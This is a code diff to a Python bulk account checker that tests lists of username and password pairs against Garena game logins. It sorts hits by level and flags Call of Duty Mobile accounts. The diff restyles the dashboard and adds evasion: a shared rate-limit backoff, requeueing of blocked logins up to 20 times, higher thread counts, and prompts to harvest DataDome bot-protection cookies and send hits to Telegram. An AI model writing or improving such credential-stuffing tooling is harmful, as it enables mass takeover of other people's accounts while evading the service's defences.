@@ -175,6 +175,21 @@ def _log(level: str, msg: str, indent: str = '  '):
     clean = _strip_rich(msg)
     print(f'{indent}{col}{icon}{_RST}  {clean}')
 
+def _prompt_box(body, title, border='bright_cyan', title_color=None,
+                box_style=None, indent=2):
+    """Rich Panel prompt — soft rounded/heavy box with per-section border color."""
+    from rich.panel import Panel
+    from rich.padding import Padding
+    from rich import box as _box
+    bs = box_style if box_style is not None else _box.ROUNDED
+    tc = title_color or border
+    console.print(Padding(
+        Panel(body,
+              title=f'[bold {tc}]{title}[/bold {tc}]',
+              border_style=border, box=bs, expand=False),
+        (0, 0, 0, indent)
+    ))
+
 THREAD_CONFIGS = {'1': {'threads': 1, 'label': '1  thread   — Safe, slower', 'icon': ''}, '2': {'threads': 3, 'label': '3  threads  — Balanced', 'icon': ''}, '3': {'threads': 5, 'label': '5  threads  — Fast', 'icon': ''}, '4': {'threads': 10, 'label': '10 threads  — Very fast (risk)', 'icon': ''}, '5': {'threads': 15, 'label': '15 threads  — Max speed (high risk)', 'icon': ''}}
 CARD = Box('┏━━┓\n┃  ┃\n┣━━┫\n┃  ┃\n┣━━┫\n┣━━┫\n┃  ┃\n┗━━┛\n')
 telegram_enabled = False
@@ -1009,19 +1024,19 @@ class BulkLiveDashboard:
         top_hits = s.get('top_hits', [])
 
         E   = '\x1b'
-        # Like the taji reference: neutral structure, color only on the data.
-        AM  = E + '[1;97m'   # bold white — titles / brand / section headers
-        CY  = E + '[96m'     # cyan — small accents (ETA, tags, Lv)
-        GN  = E + '[92m'     # green — valid / clean
-        RD  = E + '[91m'     # red — invalid
-        YL  = E + '[93m'     # yellow — not clean
-        TL  = E + '[94m'     # blue — CODM
-        PK  = E + '[95m'     # magenta — no CODM
-        WH  = E + '[97m'     # white — text
+        # Soft palette: slate frame, color on data (no magenta).
+        AM  = E + '[1;97m'           # titles / brand
+        CY  = E + '[96m'             # cyan accent (ETA / Lv tag)
+        GN  = E + '[92m'             # valid / clean
+        RD  = E + '[91m'             # invalid
+        YL  = E + '[93m'             # not clean / yellow
+        TL  = E + '[94m'             # blue — CODM
+        PK  = E + '[38;5;139m'       # soft purple-gray — No CODM (not magenta)
+        OR  = E + '[38;5;208m'       # orange accent (level high / rate limit)
+        WH  = E + '[97m'             # white text
         DIM = E + '[2m'
-        OR  = E + '[96m'     # cyan — level bars
-        BRD = E + '[96m'     # bright cyan — frame
-        BRDd= E + '[90m'     # gray — inner lines / bar tracks
+        BRD = E + '[38;5;244m'       # soft slate — frame
+        BRDd= E + '[38;5;238m'       # darker slate — bar tracks
         RST = E + '[0m'
 
         def _fmt(secs):
@@ -1086,7 +1101,7 @@ class BulkLiveDashboard:
         top_border = f'{BRD}╭{H * IW}╮{RST}'
         bot_border = f'{BRD}╰{H * IW}╯{RST}'
 
-        hdr_l = f' {YL}◆{RST} {YL}HESU{RST} {CY}v2.0{RST}  {DIM}—{RST}  {PK}@dvlist{RST}'
+        hdr_l = f' {AM}◆{RST} {AM}HESU{RST} {CY}v2.0{RST}  {DIM}—{RST}  {PK}@dvlist{RST}'
         hdr_r = f'{GN}●{RST} {GN}ACTIVE{RST}  {DIM}·{RST}  {WH}{clock}{RST} '
         hdr_gap = max(IW - V(hdr_l) - V(hdr_r), 1)
         hdr_row = f'{BRD}│{RST}{hdr_l}{" " * hdr_gap}{hdr_r}{BRD}│{RST}'
@@ -1111,7 +1126,7 @@ class BulkLiveDashboard:
         def _cell(val, label, sub, cwidth):
             return [
                 _ctr(_clip(f'{WH}{val}{RST}', cwidth), cwidth),
-                _ctr(_clip(f'{CY}{label}{RST}', cwidth), cwidth),
+                _ctr(_clip(f'{DIM}{label}{RST}', cwidth), cwidth),
                 _ctr(_clip(sub, cwidth), cwidth),
             ]
 
@@ -1173,67 +1188,82 @@ class BulkLiveDashboard:
         ip_col = GN if ip_ok else RD
 
         sec1 = [
-            _lr(f' {CY}│{RST} {WH}ACCOUNT RESULTS{RST}',
-                f' {CY}│{RST} {WH}SYSTEM{RST}'),
-            _lr(f'   {GN}▸{RST} {WH}Valid{RST}        {GN}{valid:>8,}{RST}  {GN}{vp}{RST}',
-                f'   {CY}◇{RST} {CY}Threads{RST}     {WH}{thr_val}{RST}'),
-            _lr(f'   {RD}▸{RST} {WH}Invalid{RST}      {RD}{invalid:>8,}{RST}  {RD}{ip_s}{RST}',
-                f'   {CY}●{RST} {CY}IP Status{RST}   {ip_col}{ip_val}{RST}'),
-            _lr(f'   {GN}◆{RST} {WH}Clean{RST}        {GN}{clean:>8,}{RST}  {GN}{cp}{RST}',
-                f'   {CY}▸{RST} {CY}Speed{RST}       {WH}{rate:.1f}/s{RST}'),
-            _lr(f'   {YL}◇{RST} {WH}Not Clean{RST}    {YL}{nc:>8,}{RST}  {YL}{np_s}{RST}',
-                f'   {CY}◆{RST} {CY}CPM{RST}         {WH}{cpm:.0f}{RST}'),
-            _lr(f'   {TL}●{RST} {WH}CODM{RST}         {TL}{codm_count:>8,}{RST}  {TL}{dp}{RST}',
-                f'   {CY}◇{RST} {CY}Elapsed{RST}     {WH}{elapsed_str}{RST}'),
-            _lr(f'   {PK}○{RST} {WH}No CODM{RST}      {PK}{no_codm:>8,}{RST}  {PK}{ndp}{RST}',
-                f'   {CY}○{RST} {CY}ETA{RST}         {CY}{eta_str}{RST}'),
+            _lr(f' {AM}│{RST} {AM}ACCOUNT RESULTS{RST}',
+                f' {AM}│{RST} {AM}SYSTEM{RST}'),
+            _lr(f'   {GN}▸{RST} {GN}Valid{RST}        {GN}{valid:>8,}{RST}  {DIM}{vp}{RST}',
+                f'   {CY}◇{RST} {DIM}Threads{RST}     {CY}{thr_val}{RST}'),
+            _lr(f'   {RD}▸{RST} {RD}Invalid{RST}      {RD}{invalid:>8,}{RST}  {DIM}{ip_s}{RST}',
+                f'   {ip_col}●{RST} {DIM}IP Status{RST}   {ip_col}{ip_val}{RST}'),
+            _lr(f'   {GN}◆{RST} {GN}Clean{RST}        {GN}{clean:>8,}{RST}  {DIM}{cp}{RST}',
+                f'   {GN}▸{RST} {DIM}Speed{RST}       {GN}{rate:.1f}/s{RST}'),
+            _lr(f'   {YL}◇{RST} {YL}Not Clean{RST}    {YL}{nc:>8,}{RST}  {DIM}{np_s}{RST}',
+                f'   {YL}◆{RST} {DIM}CPM{RST}         {YL}{cpm:.0f}{RST}'),
+            _lr(f'   {TL}●{RST} {TL}CODM{RST}         {TL}{codm_count:>8,}{RST}  {DIM}{dp}{RST}',
+                f'   {CY}◇{RST} {DIM}Elapsed{RST}     {WH}{elapsed_str}{RST}'),
+            _lr(f'   {PK}○{RST} {PK}No CODM{RST}      {PK}{no_codm:>8,}{RST}  {DIM}{ndp}{RST}',
+                f'   {CY}○{RST} {DIM}ETA{RST}         {CY}{eta_str}{RST}'),
         ]
 
         # ═══ SECTION 2: LEVELS & PEAKS | LIVE FEED ═══
         lvl_total_n = sum(lvl_b) or 1
         lvl_labels = ['Lv  1-100', 'Lv 101-200', 'Lv 201-349', 'Lv  350+']
-        lvl_colors = [CY, CY, CY, CY]
-        lvl_pct_c  = [GN, PK, PK, DIM]
+        lvl_colors = [GN, YL, OR, RD]
         max_bar_w = max(half - 1 - 29, 4)
+
+        hdr_bar_w = max(half - 22, 4)
+        lvl_hdr_bar = AM + '━' * hdr_bar_w + RST
 
         lvl_rows = []
         for i, (lb, cnt) in enumerate(zip(lvl_labels, lvl_b)):
             p = cnt / lvl_total_n * 100
             bar_len = int(cnt / max(max(lvl_b), 1) * max_bar_w)
             bar_fill = lvl_colors[i] + '━' * bar_len + RST + BRDd + '─' * (max_bar_w - bar_len) + RST
-            lvl_rows.append(f'   {CY}◇{RST} {WH}{lb}{RST}  {WH}{cnt:>3d}{RST} {lvl_pct_c[i]}({p:5.1f}%){RST} {bar_fill}')
+            lvl_rows.append(f'   {lvl_colors[i]}{lb}{RST}  {WH}{cnt:>3d}{RST} {DIM}({p:5.1f}%){RST} {bar_fill}')
 
         lvl_rows.append('')
-        lvl_rows.append(f'   {CY}◆{RST} {CY}Peak Shell{RST}       {YL}{hcs:>8,}{RST}')
-        lvl_rows.append(f'   {CY}◆{RST} {CY}Peak Clean{RST}       {GN}{"Lv " + str(hcl):>8s}{RST}')
-        lvl_rows.append(f'   {CY}○{RST} {CY}Peak Not Cln{RST}     {YL}{"Lv " + str(hnl):>8s}{RST}')
+        lvl_rows.append(f'   {YL}◆{RST} {WH}Peak Shell{RST}       {YL}{hcs:>8,}{RST}')
+        lvl_rows.append(f'   {GN}◆{RST} {WH}Peak Clean{RST}       {GN}{"Lv " + str(hcl):>8s}{RST}')
+        lvl_rows.append(f'   {YL}○{RST} {WH}Peak Not Cln{RST}     {YL}{"Lv " + str(hnl):>8s}{RST}')
 
         if top_hits:
             lvl_rows.append('')
-            lvl_rows.append(f' {YL}│{RST} {YL}TOP HITS (Lv 100+){RST}')
+            lvl_rows.append(f' {AM}│{RST} {AM}TOP HITS (Lv 100+){RST}')
             for lvl, acct, tag, is_cln in top_hits[:3]:
-                tc = GN if is_cln else WH
-                lvl_rows.append(f'   {tc}Lv {lvl:<4d}{RST}  {DIM}{acct}{RST}  {tc}◇ {tag}{RST}')
+                tc = GN if is_cln else YL
+                lvl_rows.append(f'   {CY}Lv {lvl:<4d}{RST}  {DIM}{acct}{RST}  {tc}◇ {tag}{RST}')
 
         feed_rows = []
         feed_text_w = max(IW - half - 1 - 13, 8)
+        acct_w   = max(feed_text_w - 18, 6)  # leaves 16 for reason column
+        reason_w = 14
+        def _fit(s, w):
+            if len(s) > w:
+                return s[:w-1] + '…'
+            return s.ljust(w)
         for entry in feed[-10:]:
             num, acct, ok, reason = entry[0], entry[1], entry[2], entry[3]
             lvl = entry[4] if len(entry) > 4 else 0
             lvl_tag = f'{CY}Lv{lvl}{RST} ' if lvl else ''
-            if ok:
-                mark = f'{GN}✔{RST}'
+            # Reclassify rate-limit as orange "⚠ RATE LIMITED" (not red IP Blocked)
+            if reason in ('IP Blocked', 'Cookie Banned/IP Blocked'):
+                reason_disp = '⚠ RATE LIMITED'
+                rc = OR
+            elif ok:
+                reason_disp = reason
                 rc = GN if reason == 'CLEAN' else YL
-                text = f'{WH}{acct}{RST}  {lvl_tag}{rc}{reason}{RST}'
             else:
-                mark = f'{RD}✖{RST}'
-                text = f'{DIM}{acct}{RST}  {RD}{reason}{RST}'
-            text, _ = _trunc(text, feed_text_w)
-            feed_rows.append(f'   {DIM}{num:>5d}{RST} {mark}  {text}')
+                reason_disp = reason
+                rc = RD
+            acct_s   = _fit(acct, acct_w)
+            reason_s = _fit(reason_disp, reason_w)
+            mark = f'{GN}✔{RST}' if ok else f'{RD}✖{RST}'
+            acct_col = WH if ok else DIM
+            text = f'{acct_col}{acct_s}{RST}  {lvl_tag}{rc}{reason_s}{RST}'
+            feed_rows.append(f'   {CY}{num:>5d}{RST} {mark}  {text}')
 
         sec2_hdr = _lr(
-            f' {CY}│{RST} {WH}LEVELS & PEAKS{RST}',
-            f' {PK}│{RST} {PK}LIVE FEED{RST}')
+            f' {AM}│{RST} {AM}LEVELS & PEAKS{RST}  {lvl_hdr_bar}',
+            f' {AM}│{RST} {AM}LIVE FEED{RST}')
         sec2 = [sec2_hdr]
         mr = max(len(lvl_rows), len(feed_rows))
         for i in range(mr):
@@ -1272,7 +1302,7 @@ class ResultsManager:
     def __init__(self, combo_file_path, create_dirs=True):
         self.combo_file_name = Path(combo_file_path).stem
         self.timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        self.base_dir = Path(f'Results/{self.combo_file_name}')
+        self.base_dir = Path(f'Results/output_{self.combo_file_name}')
         if create_dirs:
             for sub in ('Country', 'Level', 'Garena Shells'):
                 (self.base_dir / sub).mkdir(parents=True, exist_ok=True)
@@ -1454,6 +1484,44 @@ _PROXIES_ACTIVE = False
 _SESSION_POOL = []
 _SESSION_POOL_INDEX = 0
 _SESSION_POOL_LOCK = threading.Lock()
+
+# ── Adaptive rate-limit throttle (single-IP backoff) ─────────────────────
+_RATE_LIMIT_LOCK   = threading.Lock()
+_RATE_LIMIT_HITS   = 0         # consecutive IP-blocked observations
+_RATE_LIMIT_UNTIL  = 0.0       # workers sleep until this monotonic time
+
+def _ratelimit_wait():
+    """Workers call this before each attempt; sleeps until the shared cooldown
+    passes. Uses monotonic clock so it's safe under system-clock jumps."""
+    import time as _t
+    while True:
+        with _RATE_LIMIT_LOCK:
+            until = _RATE_LIMIT_UNTIL
+        now = _t.monotonic()
+        if now >= until:
+            return
+        _t.sleep(min(until - now, 1.0))
+
+def _ratelimit_hit():
+    """A worker just saw IP_BLOCKED/403. Extend the shared cooldown with a
+    gentle ramp: 1st hit = 0.3s, grows to a 5s ceiling."""
+    import time as _t
+    global _RATE_LIMIT_HITS
+    with _RATE_LIMIT_LOCK:
+        _RATE_LIMIT_HITS = min(_RATE_LIMIT_HITS + 1, 10)
+        delay = min(0.3 * (2 ** (_RATE_LIMIT_HITS - 1)), 5.0)
+        new_until = _t.monotonic() + delay
+        global _RATE_LIMIT_UNTIL
+        if new_until > _RATE_LIMIT_UNTIL:
+            _RATE_LIMIT_UNTIL = new_until
+
+def _ratelimit_ok():
+    """Any non-blocked response: decay the cooldown. Not reset instantly so a
+    burst of good + bad doesn't oscillate."""
+    global _RATE_LIMIT_HITS
+    with _RATE_LIMIT_LOCK:
+        if _RATE_LIMIT_HITS > 0:
+            _RATE_LIMIT_HITS -= 1
 
 _DATADOME_SEEDS = []
 _DATADOME_SEED_LOCK = threading.Lock()
@@ -2021,7 +2089,7 @@ class DataDomeManager:
                 continue
         return None
 
-    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
+    def wait_for_ip_change(self, session, check_interval=3, max_wait_time=15):
         global _ip_wait_lock, _ip_wait_active, _ip_wait_event, _PROXIES_ACTIVE
         if _PROXIES_ACTIVE:
             return False
@@ -2895,6 +2963,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
     while True:
         attempt += 1
         try:
+            _ratelimit_wait()   # back off under a shared IP-block cooldown
             datadome_manager.tick_request()
             session.cookies.clear()
             init_ga_cookies(session)
@@ -2920,6 +2989,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             v1, v2, new_datadome = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)
 
             if v1 == 'IP_BLOCKED':
+                _ratelimit_hit()   # extend shared cooldown for ALL workers
                 if proxy_manager and proxy_manager.is_loaded():
                     session.proxies.clear()
                     session.proxies.update(proxy_manager.get_next())
@@ -2933,8 +3003,11 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                     datadome_manager.clear_session_datadome(session)
                     return 'IP_CHANGED'
                 else:
+                    # IP never changed — this is rate-limiting, not a dead account.
+                    # Defer to the back of the queue so the throttle has time to
+                    # cool and we retry when the service is accepting requests.
                     if defer_transient:
-                        return 'TRANSIENT'
+                        return 'RATE_LIMITED'
                     live_stats.update_stats(is_error=True)
                     account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'IP Change Timeout'}
                     results_manager.add_account(account_data)
@@ -2967,6 +3040,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 return 'ERROR'
 
             if v1 == 'NO_ACCOUNT':
+                _ratelimit_ok()
                 live_stats.update_stats(valid=False)
                 account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': "error_auth"}
                 results_manager.add_account(account_data)
@@ -2977,6 +3051,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 return 'ERROR'
 
             if v1 == 'ERROR_AUTH':
+                _ratelimit_ok()
                 reason = str(v2) if v2 else 'error_auth'
                 live_stats.update_stats(valid=False)
                 account_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': reason}
@@ -3013,7 +3088,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
                 datadome_manager.set_session_datadome(session, new_datadome)
 
             sso_key = login(session, account, password, v1, v2)
-                
+            _ratelimit_ok()   # login reached — service accepting requests
+
             if not sso_key:
                 err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Invalid Credentials'}
                 live_stats.update_stats(valid=False)
@@ -3626,11 +3702,11 @@ def prompt_proxy_setup():
         console.print(Panel(
             Text(title, style="bold bright_white") if not subtitle
             else Text(title, style="bold bright_white") + Text(f"\n{subtitle}", style="dim"),
-            border_style="bright_cyan", box=box.ROUNDED, expand=False
+            border_style="bright_yellow", box=box.ROUNDED, expand=False
         ))
         print()
 
-    def _panel(content, border="cyan"):
+    def _panel(content, border="bright_cyan"):
         console.print(Panel(content, border_style=border, box=box.ROUNDED, expand=False))
         print()
 
@@ -4329,7 +4405,9 @@ def bulk_check(bulk_mode: str = 'full'):
         _log('INFO', '[dim]Auto-remove enabled.[/dim]')
 
     global HARVEST_COOKIES
-    HARVEST_COOKIES = input(f"  \033[96m>\033[0m harvest cookies? (y/N): ").strip().lower() == 'y'
+    _prompt_box('[white]Harvest datadome cookies while checking? (y/N)[/white]',
+                '❯ Cookie Harvest', border='bright_cyan')
+    HARVEST_COOKIES = input("    ❯ ").strip().lower() == 'y'
     if HARVEST_COOKIES:
         _log('SUCCESS', 'Cookie harvesting enabled.', '    ')
 
@@ -4352,7 +4430,7 @@ def bulk_check(bulk_mode: str = 'full'):
         file_table.add_column(style='bright_white', no_wrap=True)
         file_table.add_row('File', f'[cyan]{Path(selected_file).name}[/cyan]')
         file_table.add_row('Accounts', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
-        console.print(Panel(file_table, title='[bold bright_green]✔ FILE LOADED[/bold bright_green]', border_style='bright_cyan', box=CARD, padding=(0, 2), expand=False, width=60))
+        console.print(Panel(file_table, title='[bold bright_green]✔ FILE LOADED[/bold bright_green]', border_style='bright_green', box=box.HEAVY, padding=(0, 2), expand=False, width=60))
     except Exception:
         _log('ERROR', 'Could not read file.')
         return
@@ -4364,7 +4442,7 @@ def bulk_check(bulk_mode: str = 'full'):
     info_table.add_column(style='bright_white', no_wrap=True)
     info_table.add_row('Total Queued', f'[bold bright_white]{len(accounts):,}[/bold bright_white]')
     info_table.add_row('Status', '[bright_green]Ready[/bright_green]')
-    console.print(Panel(info_table, title='[bold bright_cyan]ℹ ACCOUNT QUEUE[/bold bright_cyan]', border_style='bright_cyan', box=CARD, padding=(0, 2), expand=False, width=50))
+    console.print(Panel(info_table, title='[bold bright_green]ℹ ACCOUNT QUEUE[/bold bright_green]', border_style='bright_green', box=box.HEAVY, padding=(0, 2), expand=False, width=50))
     results_manager = ResultsManager(selected_file)
     cookie_manager = CookieManager()
     datadome_manager = DataDomeManager()
@@ -4378,15 +4456,18 @@ def bulk_check(bulk_mode: str = 'full'):
     else:
         _log('INFO', '[dim]Direct connection (no proxies)[/dim]')
     print()
-    max_threads = 250 if using_proxy else 80
-    _P = '\033[96m'
+    max_threads = 400 if using_proxy else 100
     print()
-    print(f"  {_P}│{_RST} {_P}THREAD CONFIG{_RST}")
-    print(f"    {_DIM}30-80 direct  ·  80-150 balanced  ·  150+ proxy{_RST}")
-    print()
+    _tc_body = (f'[white]30-80[/white] [dim]direct[/dim]   '
+                f'[yellow]80-150[/yellow] [dim]balanced[/dim]   '
+                f'[bright_green]350+[/bright_green] [dim]proxy[/dim]\n'
+                f'[dim]default:[/dim] [bold white]{DEFAULT_THREADS}[/bold white]   '
+                f'[dim]max:[/dim] [bold white]{max_threads}[/bold white]')
+    _prompt_box(_tc_body, '◆ THREAD CONFIG',
+                border='bright_yellow', box_style=box.HEAVY)
     while True:
         try:
-            raw = input(f"  {_P}▸{_RST} threads 1-{max_threads} {_DIM}(default {DEFAULT_THREADS}){_RST}: ").strip()
+            raw = input(f"    \033[93m❯\033[0m threads 1-{max_threads} \033[2m(enter={DEFAULT_THREADS})\033[0m: ").strip()
             num_threads = DEFAULT_THREADS if not raw else int(raw)
             if 1 <= num_threads <= max_threads:
                 break
@@ -4396,9 +4477,12 @@ def bulk_check(bulk_mode: str = 'full'):
     _log("SUCCESS", f"Running with {_BRT}{num_threads}{_RST} thread(s)")
     print()
     global CHECK_OTHER_GAMES
-    print(f"  {_P}│{_RST} {_P}OTHER GAMES{_RST}")
-    print(f"    {_DIM}AOV / ROV / FF / Delta Force… (+1-3s/acc){_RST}")
-    CHECK_OTHER_GAMES = input(f"  {_P}▸{_RST} check other games? (y/N): ").strip().lower() == "y"
+    _og_body = ('[white]Check other Garena games[/white]  '
+                '[dim]AOV / ROV / Free Fire / Delta Force…[/dim]\n'
+                '[dim]Saves each game to a separate file  ·  ~1-3s/account[/dim]')
+    _prompt_box(_og_body, '◇ OTHER GAMES',
+                border='cyan', box_style=box.HEAVY)
+    CHECK_OTHER_GAMES = input("    \033[96m❯\033[0m check other games? (y/N): ").strip().lower() == "y"
     _log("SUCCESS" if CHECK_OTHER_GAMES else "INFO", "Will scan all Garena game connections" if CHECK_OTHER_GAMES else f"{_DIM}CODM only — skipping other game checks{_RST}")
     print()
     _TG_CFG_FILE = os.path.join(_SCRIPT_DIR_COOKIE, '.tg_cfg')
@@ -4420,14 +4504,16 @@ def bulk_check(bulk_mode: str = 'full'):
         except Exception:
             return None
     _saved_tg = _tg_load()
-    _P = '\033[96m'
     print()
-    print(f"  {_P}│{_RST} {_P}TELEGRAM NOTIFICATIONS{_RST}")
-    print(f"    {_WH}1{_RST} clean only  {_DIM}·{_RST}  {_WH}2{_RST} not-clean  {_DIM}·{_RST}  {_WH}3{_RST} both  {_DIM}·{_RST}  {_WH}4{_RST} skip")
-    print()
+    _tg_body = ('[bold white]1[/bold white]  [bright_green]›[/bright_green]  Send Clean hits only\n'
+                '[bold white]2[/bold white]  [yellow]›[/yellow]  Send Not-Clean hits only\n'
+                '[bold white]3[/bold white]  [bright_cyan]›[/bright_cyan]  Send Both (clean + not-clean)\n'
+                '[bold white]4[/bold white]  [dim]›[/dim]  No Telegram (skip)')
+    _prompt_box(_tg_body, '⬡ TELEGRAM NOTIFICATION SETUP',
+                border='bright_green', box_style=box.HEAVY)
     tg_choice = ''
     while tg_choice not in ('1', '2', '3', '4'):
-        tg_choice = input(f'  {_P}▸{_RST} ').strip()
+        tg_choice = input('    \033[92m❯\033[0m ').strip()
     TG_ENABLED = tg_choice != '4'
     TG_SEND_CLEAN = tg_choice in ('1', '3')
     TG_SEND_NOTCLEAN = tg_choice in ('2', '3')
@@ -4552,9 +4638,11 @@ def bulk_check(bulk_mode: str = 'full'):
     # Requeue buffer — transient failures (IP flip / network reset) go back here
     # to be re-checked on the new IP instead of being written off.
     _requeue = deque()
-    _requeue_counts = {}
+    _requeue_counts = {}        # transient (network-reset) retry counter
+    _rate_counts    = {}        # rate-limit retry counter (separate budget)
     requeue_lock = threading.Lock()
-    _MAX_REQUEUE = 1
+    _MAX_REQUEUE      = 1       # network-transient — rare, 1 retry
+    _MAX_RATE_REQUEUE = 20      # rate-limit — generous; throttle cools in time
     global _suppress_ip_prints, _ip_block_callback
     _suppress_ip_prints = True
     def _ip_block_cb(blocked: bool):
@@ -4613,14 +4701,23 @@ def bulk_check(bulk_mode: str = 'full'):
             dashboard.record_start(my_index, acc_name)
         except Exception:
             pass
-        def _try_requeue(account_line):
-            # Put a transient-failed account back on the queue to be re-checked on
-            # the new IP. Returns True if requeued, False once it has used up its
-            # budget (then it should be recorded as a final error, not lost).
+        def _try_requeue_transient(account_line):
+            # Network-reset type retries (rare, tight budget).
             with requeue_lock:
                 n = _requeue_counts.get(account_line, 0) + 1
                 _requeue_counts[account_line] = n
                 if n <= _MAX_REQUEUE:
+                    _requeue.append(account_line)
+                    return True
+            return False
+        def _try_requeue_rate(account_line):
+            # Rate-limited: push to the back of the deque. Big budget because the
+            # throttle cools the IP by the time we cycle around; most accounts
+            # succeed on the 2nd or 3rd pass, not the 20th.
+            with requeue_lock:
+                n = _rate_counts.get(account_line, 0) + 1
+                _rate_counts[account_line] = n
+                if n <= _MAX_RATE_REQUEUE:
                     _requeue.append(account_line)
                     return True
             return False
@@ -4648,7 +4745,8 @@ def bulk_check(bulk_mode: str = 'full'):
                 # Cap retries: on a single blocked IP that never actually changes,
                 # this loop would spin forever and hang the tail of the run.
                 if ip_change_tries > 3:
-                    if _try_requeue(account_line):
+                    # Rate-limit bucket (not a bad account) — defer to the back.
+                    if _try_requeue_rate(account_line):
                         return
                     _record_error('IP Blocked')
                     return
@@ -4669,11 +4767,19 @@ def bulk_check(bulk_mode: str = 'full'):
                 time.sleep(0.5)
                 continue
             break
+        if status == 'RATE_LIMITED':
+            # Service is rate-limiting us (single-IP VPN / IP not rotating).
+            # Push to the back of the queue; the global throttle will slow all
+            # workers while cooldown passes, and by the time we cycle around the
+            # IP should be accepting requests again.
+            if _try_requeue_rate(account_line):
+                return
+            _record_error('IP Blocked')
+            return
         if status == 'TRANSIENT':
-            # Account was never actually judged (IP flip / network reset).
-            # Re-check it on the new IP; once requeues are spent, record it as a
-            # counted error (and keep it in the file) instead of dropping it.
-            if _try_requeue(account_line):
+            # Account was never actually judged (connection reset, etc).
+            # Tight 1-try budget — if it fails again, record as error (kept in file).
+            if _try_requeue_transient(account_line):
                 return
             _record_error('Network Error')
             return
